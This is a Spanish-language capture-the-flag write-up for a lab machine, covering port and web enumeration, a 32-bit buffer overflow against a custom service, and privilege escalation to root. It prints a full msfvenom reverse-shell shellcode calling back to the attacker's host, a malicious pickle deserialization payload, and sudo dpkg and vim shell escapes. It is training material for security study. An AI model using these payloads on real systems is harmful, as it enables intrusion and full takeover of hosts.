### Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 2000 172.17.0.2
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-25 15:58 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Did not follow redirect to http://timer.dl
9000/tcp open  cslistener?
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
```
puedo observar 2 servicios, puerto 80 (servicio web) y otro servicio corriendo en el puerto 9000 (servicio desconocido), asi que chequeo el servicio web pero antes
agrego al archivo `/etc/hosts` el dominio que reporta `nmap`

```ruby
echo '172.17.0.2  timer.dl' >> /etc/hosts
```

![image](https://github.com/user-attachments/assets/2ce14621-b1f4-4405-8326-39947f96cbef)

la web tiene un contador hasta fin de año, no tiene nada de interes en el codigo fuente asi que le aplico fuzzing web

### Fuzzing

```ruby
gobuster dir -u http://timer.dl -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,py,txt,git,sh
```
```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://timer.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,py,txt,git,sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 273]
/.html                (Status: 403) [Size: 273]
/manager.php          (Status: 200) [Size: 1472]
/index.php            (Status: 200) [Size: 2567]
/.html                (Status: 403) [Size: 273]
/.php                 (Status: 403) [Size: 273]
/server-status        (Status: 403) [Size: 273]
Progress: 1453501 / 1453508 (100.00%)
===============================================================
Finished
===============================================================
```
aqui observo el directorio `manager.php` asi que accedo a el

![image](https://github.com/user-attachments/assets/3338b07c-105b-44ed-8187-421e4fde47b5)

me descargo el archivo `bitlock` y lo chequeo a ver de que trata

![image](https://github.com/user-attachments/assets/811beddf-c878-41c8-bd2e-9255aaf9e8ab)

por lo visto se trata de un binario, lo ejecuto a ver de que va

![image](https://github.com/user-attachments/assets/8bff3f71-7e52-44e8-9978-c26e42d20b1f)

por lo visto este binario debe ser el que se ejecuta del lado del servidor y el que nos reporto `nmap` (el servicio desconocido), comienzo haciendo pruebas

![image](https://github.com/user-attachments/assets/be134461-2d89-4918-8a8a-da7688c3da4c)

testeare si llega ser vulnerable a un `buffer overflow`

![image](https://github.com/user-attachments/assets/5bffc276-d5a5-44c5-8e56-b4b9d693d4aa)

ocurrio un desbordamiento de buffer por lo que intentare ver de que manero logro explotarlo y si llega a ser de utilidad

### Explotando Buffer Overflow

ya que conozco que se trata de un binario de 32bit, ahora chequeare las protecciones

```ruby
checksec --file=bitlock
```

![image](https://github.com/user-attachments/assets/dd5adbe8-2b7c-4c02-952f-dd5db30e8477)

no tiene protecciones activas, asi que ahora calculare el `offset`

```ruby
gdb ./bitlock -q # corro el binario con un depurador
```

![image](https://github.com/user-attachments/assets/5c13be39-0a58-492d-a59e-b95db4d991f7)

ahora creo una cadena con `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb` para enviarla al binario

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
```

![image](https://github.com/user-attachments/assets/62b52040-65af-4683-942f-71d1a9f75935)

a continuacion se la envio al binario

![image](https://github.com/user-attachments/assets/b30df4e0-228b-4420-88d6-12b2c37937c4)

aqui observo la direccion del registro `eip` asi que ese valor se lo pasamos al siguiente exploit

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61413761
```

![image](https://github.com/user-attachments/assets/57981214-7747-4751-98ef-d7b9b7f4c98f)

obtenemos el valor `offset` que es de 22 byte, ahora testeo si obtengo el control del registro `eip`

![image](https://github.com/user-attachments/assets/0d4ac577-7af8-4eb5-baa6-0614d7e68c90)


logro entonces tomar el control sobre el registro `eip`, sabiendo esto ahora calculo la direccion de la funcion `jmp_esp` que es la que apunta al comienzo de la pila
para intentar incrustar una `shellcode` y debo intentarlo de esta forma ya que el tamano del buffer es muy pequeno para almacenar una `shellcode`

![image](https://github.com/user-attachments/assets/fcfaa5f5-0d80-401e-bb48-2ab8acd87da2)

aqui obtengo la direccion de memoria de la funcion `jmp_esp` a la cual apuntare en el registro `eip` para redirigir el flujo del programa al comienzo de la pila, ahora
confirmare que lo que envie despues de sobreescribir el `eip` se almacene al comienzo de la pila

![image](https://github.com/user-attachments/assets/8d2d5739-b59f-4f60-88f3-8bf3a7d8d543)

tal como pensaba, lo que envie luego de `eip` se va alojar al comienzo de la pila, ahora creare la `shellcode` que inyectare

```ruby
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -b '\x00\x0a\x0d' -f hex #generamos la shellcode
```
```bash
bbc08f65e8d9ecd97424f45829c9b11231581283c004039881871d2945b03d1a3a6ca89e35739cf888f44e5da3cabddd8a4dc7b5a0bf3744d1bd37577d4bd6e71b1b48545798e3bb5a1fa1530b0f35cbbb60966955f60b3ff6812d0ff35c2d
```

obtenemos una cadena en hexadecimal la cual vamos a modificar para poder inyectarla al binario, la cadena modificada quedaria asi

```ruby
\xbb\xc0\x8f\x65\xe8\xd9\xec\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x12\x31\x58\x12\x83\xc0\x04\x03\x98\x81\x87\x1d\x29\x45\xb0\x3d\x1a\x3a\x6c\xa8\x9e\x35\x73\x9c\xf8\x88\xf4\x4e\x5d\xa3\xca\xbd\xdd\x8a\x4d\xc7\xb5\xa0\xbf\x37\x44\xd1\xbd\x37\x57\x7d\x4b\xd6\xe7\x1b\x1b\x48\x54\x57\x98\xe3\xbb\x5a\x1f\xa1\x53\x0b\x0f\x35\xcb\xbb\x60\x96\x69\x55\xf6\x0b\x3f\xf6\x81\x2d\x0f\xf3\x5c\x2d
```
ya teniendo todo lo necesario testeo si logro inyectar la `shellcode` y para eso primero me coloco en escucha por el puerto `4444` para luego enviar el payload al binario

![image](https://github.com/user-attachments/assets/ccc2b3a4-02a2-4e99-b43a-ebf71f1bb1ed)

logre inyectar correctamente la `shellcode` y obtener asi una `revershell`


Estructura del `payload`
```bash
payload = {offset} + {address jmp_esp} + {NOP's} + {shellcode}
```

ahora en vez de apuntar a la ip `172.17.0.1` que es mi ip, apuntare el `payload` a la ip del servidor `172.17.0.2`

![image](https://github.com/user-attachments/assets/b8eb8980-05f8-4a4a-87cb-532474765c44)

obtengo acceso al servidor!!!!

## Escalada de Privilegios

### www-data

tratamiento de la tty

```ruby
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 38 columns 168
export TERM=xterm
export SHELL=bash
```

observo que puedo ejecutar un script `.py` como el user `maci`

![image](https://github.com/user-attachments/assets/3d520f62-9495-4ffe-a0c2-0291266c3d71)

si ejecuto el binario me arroja el siguiente mensaje

![image](https://github.com/user-attachments/assets/f6ee1a9e-6360-4cb1-9462-edbf507b10e8)

para entender que es lo que hace el script, intento leero

```python
import pickle
import os

file_path = "/opt/data.pk1"
config_file_path = "/home/maci/.time_seri/time.conf"

def load_pickle_file(file_path):
    """Carga un archivo pickle y devuelve su contenido."""
    if not os.path.exists(file_path):
        print(f"El archivo {file_path} no se encontró.")
        return None
    
    try:
        with open(file_path, 'rb') as f:
            data = pickle.load(f)
            return data
    except PermissionError:
        print("No tienes permiso para leer el archivo.")
    except pickle.UnpicklingError:
        print("Error al deserializar el archivo: el archivo puede estar corrupto o no es un archivo pickle válido.")
    except EOFError:
        print("El archivo está vacío o truncado.")
    except Exception as e:
        print(f"Ocurrió un error inesperado: {e}")
    
    return None

def is_serial_enabled(config_file_path):
    """Verifica si la serialización está habilitada en el archivo de configuración."""
    if not os.path.exists(config_file_path):
        print(f"El archivo de configuración {config_file_path} no se encontró.")
        return False
    
    with open(config_file_path, 'r') as config_file:
        for line in config_file:
            if line.startswith('serial='):
                value = line.split('=')[1].strip()
                return value.lower() == 'on'
    
    return False

if __name__ == "__main__":
    if is_serial_enabled(config_file_path):
        data = load_pickle_file(file_path)
        if data is not None:
            print("Datos deserializados correctamente, puedes revisar /tmp")
#            print(data)
    else:
        print("La serialización está deshabilitada. El programa no se ejecutará.")
```

el script lo que hace es deserializar el archivo `/opt/data.pk1`, por otro lado observo una validacion en un archivo de configuracion chequeando como esta seteado
la variable `serial`, si `serial=on`  en `/home/maci/.time_seri/time.conf` deserializa el archivo `/opt/data.pk1`, sino la variable `serial` no es `on` es cuando arroja
el mensaje `La serialización está deshabilitada. El programa no se ejecutará.`; asi que chequeo si puedo llevar a modificar el archivo de configuracion

![image](https://github.com/user-attachments/assets/b075e495-79b6-445e-8bb8-9a2ef8d6ea60)

si es posible modificar el archivo `/home/maci/.time_seri/time.conf` asi que seteo a `on` la variable `serial`

![image](https://github.com/user-attachments/assets/4155fa1b-7cae-4f24-bae2-f405d2179d19)

ya seteada a `on` la variable vuelvo ejecutar el script como el user `maci`

![image](https://github.com/user-attachments/assets/ade6a29e-c229-46c4-880a-16b43e178704)

reviso `tmp` y me consigo con 2 registros `log`

```ruby
cat /tmp/logs.log

se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
se a detenido el programa!, volviendo a ejecutar
```
```ruby
cat /tmp/.data2.log

hola maci, es darksblack recuerda terminar la maquina antes que finalice el mes
```

solo observo un mensaje, pero si vuelvo al script que se encarga de deserializar, recordemos que deserializa el archivo `/opt/data.pk1` y al revisar los permisos
del archivo veo que es posible modificarlo

![image](https://github.com/user-attachments/assets/af56c9ee-a2ae-4b98-a208-897a7081e2e9)

esto puede conducir a una inyeccion de comandos al manipular el archivo que es deserializado por el script que ejecuta el user `maci`, asi que voy a manipular dicho archivo
 con codigo malicioso para que ejecute comandos y obtener entonces una bash como `maci`


 ```python
import pickle
import os

class Malicious:
   def __reduce__(self):
           return (os.system, ('whoami;id',))

   # Serializar el objeto malicioso
with open('/opt/data.pk1', 'wb') as f:
       pickle.dump(Malicious(), f)
```

guardo el script como `/tmp/inyeccion.py`

este script lo que hara sera modificar el contenido del archivo `/opt/data.pk1` inyectando comandos que se ejecutaran cuando se deserialice

```ruby
chmod +x /tmp/inyeccion.py # le damos permisos de ejecucion
```

ahora ejecuto el script `inyeccion.py`

```ruby
python3 inyeccion.py
```

y luego ejecuto el script de deserializacion como el user `maci`

```ruby
sudo -u maci /bin/python3 /home/maci/.time_seri/time.py
```

![image](https://github.com/user-attachments/assets/81f017f2-a2da-476b-8c7f-9e5fe950f92e)

se han ejecuto los comandos que inyecte, ahora cambiare los comandos `whoami;id` por `/bin/bash` quedando el script `inyeccion.py` de la siguiente manera

```ruby
import pickle
import os

class Malicious:
   def __reduce__(self):
           return (os.system, ('/bin/bash',))

   # Serializar el objeto malicioso
with open('/opt/data.pk1', 'wb') as f:
       pickle.dump(Malicious(), f)
```
Ejecuto nuevamente inyeccion.py para modificar el contenido de `/opt/data.pk1` con el comando `/bin/bash` y despues ejecuto
el script de deserializacion como el user `maci` y obtengo la shell como `maci`

![image](https://github.com/user-attachments/assets/c158e82e-2a86-4273-ab01-691a1c0a1bbe)

### maci

con este usuario puedo ejecutar como el user `darksblack` el binario `/usr/bin/dpkg`

![image](https://github.com/user-attachments/assets/6b396ffd-8b6e-4b07-ba10-edf984d5b3f2)

intento escalar pero es un poco mas complicado porque al parecer el user `darksblack` esta dentro de una `-rbash`

```ruby
sudo -u darksblack /usr/bin/dpkg -l
```
![image](https://github.com/user-attachments/assets/34df5620-0f35-414d-aa9d-47b762f72c0b)

intento enviar una revershell pero no lo consigo, asi que la codeo en `base64` y obtengo la `revershell`

![image](https://github.com/user-attachments/assets/e4ea3636-268d-4396-953c-2355a2feac4a)

el problema como ya decia, es que `darksblack` esta dentro de una `rbash` 

![image](https://github.com/user-attachments/assets/cd20eaf7-30bb-42b6-980c-185b8a79b129)

no puedo ejecutar comandos, pero desde dpkg si puedo bypassear la `rbash` y ejecutar comandos asi que termino la `revershell` y testeo desde `dpkg`

![image](https://github.com/user-attachments/assets/bdf335ef-3a3a-4462-99ce-9a5ea2b80903)

el user `darksblack` tiene permitido ejecutar `/usr/bin/vim` como `root` asi que intento realizar la escalada desde `dpkg`

![image](https://github.com/user-attachments/assets/b1c20a3f-5e6a-4bc7-b0d1-53924c6436c1)

al ejecutar el comando se abre el editor de texto `vim` y como esta siendo ejecuto por `root` puedo terminar de escalar

![image](https://github.com/user-attachments/assets/eab41fb2-8547-4ad4-8b96-214714982805)

aqui ejecuto `:!/bin/bash`

![image](https://github.com/user-attachments/assets/c8a78d78-7d18-4463-adef-2cd2a29e79cc)

obtengo la shell como `root`

![image](https://github.com/user-attachments/assets/d56802e9-d497-4d40-89e7-b78a2d31b253)

### PWNED - ROOT


































